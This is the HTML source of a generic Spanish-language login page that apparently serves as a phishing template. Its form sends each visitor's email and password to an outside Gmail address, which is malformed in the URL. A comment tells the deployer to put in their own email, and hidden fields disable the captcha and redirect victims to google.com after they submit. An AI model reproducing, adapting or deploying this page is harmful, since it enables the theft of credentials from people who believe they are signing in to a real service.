<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Iniciar sesión</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      padding: 0;
      background-image: url('https://images.unsplash.com/photo-1521791136064-7986c2920216?auto=format&fit=crop&w=1350&q=80');
      background-size: cover;
      background-position: center;
      font-family: 'Roboto', sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      backdrop-filter: blur(2px);
    }

    .login-box {
      background: rgba(255, 255, 255, 0.85);
      padding: 40px 30px;
      border-radius: 15px;
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
      backdrop-filter: blur(6px);
      border: 1px solid rgba(255, 255, 255, 0.2);
      width: 100%;
      max-width: 360px;
      color: #000;
    }

    .login-box h2 {
      text-align: center;
      margin-bottom: 30px;
      font-size: 24px;
      color: #0d1b2a;
    }

    .input-group {
      position: relative;
      margin-bottom: 20px;
    }

    .input-group input {
      width: 100%;
      padding: 12px 40px 12px 40px;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 14px;
      background: rgba(255, 255, 255, 0.9);
      color: #000;
    }

    .input-group input::placeholder {
      color: #444;
    }

    .input-group i {
      position: absolute;
      left: 12px;
      top: 50%;
      transform: translateY(-50%);
      color: #555;
    }

    .toggle-password {
      position: absolute;
      right: 12px;
      top: 50%;
      transform: translateY(-50%);
      cursor: pointer;
      color: #333;
      font-size: 13px;
    }

    input[type="submit"] {
      width: 100%;
      background-color: #0033a0;
      color: #fff;
      border: none;
      padding: 12px;
      font-size: 15px;
      border-radius: 6px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    input[type="submit"]:hover {
      background-color: #002280;
    }

    .note {
      text-align: center;
      font-size: 12px;
      color: #333;
      margin-top: 20px;
    }

    .note a {
      color: #0033a0;
      text-decoration: none;
    }

    .note a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <h2>Iniciar sesión</h2>
    
    <!-- CAMBIA AQUÍ TU CORREO -->
    <form action="https://aliasp148@gmail.com" method="POST">
      <div class="input-group">
        <i class="fas fa-user"></i>
        <input type="text" name="usuario" placeholder="Correo electrónico" required>
      </div>

      <div class="input-group">
        <i class="fas fa-lock"></i>
        <input type="password" name="password" placeholder="Contraseña" id="password" required>
        <span class="toggle-password" onclick="togglePassword()">Mostrar</span>
      </div>

      <!-- Configuración para redirección y sin captcha -->
      <input type="hidden" name="_next" value="https://www.google.com">
      <input type="hidden" name="_captcha" value="false">

      <input type="submit" value="Entrar">
    </form>
    
    <div class="note">
      ¿Olvidaste tu contraseña? <a href="#">Recupérala</a>
    </div>
  </div>

  <!-- Font Awesome para íconos -->
  <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
  <script>
    function togglePassword() {
      const pass = document.getElementById('password');
      const toggle = document.querySelector('.toggle-password');
      if (pass.type === 'password') {
        pass.type = 'text';
        toggle.textContent = 'Ocultar';
      } else {
        pass.type = 'password';
        toggle.textContent = 'Mostrar';
      }
    }
  </script>
</body>
</html>
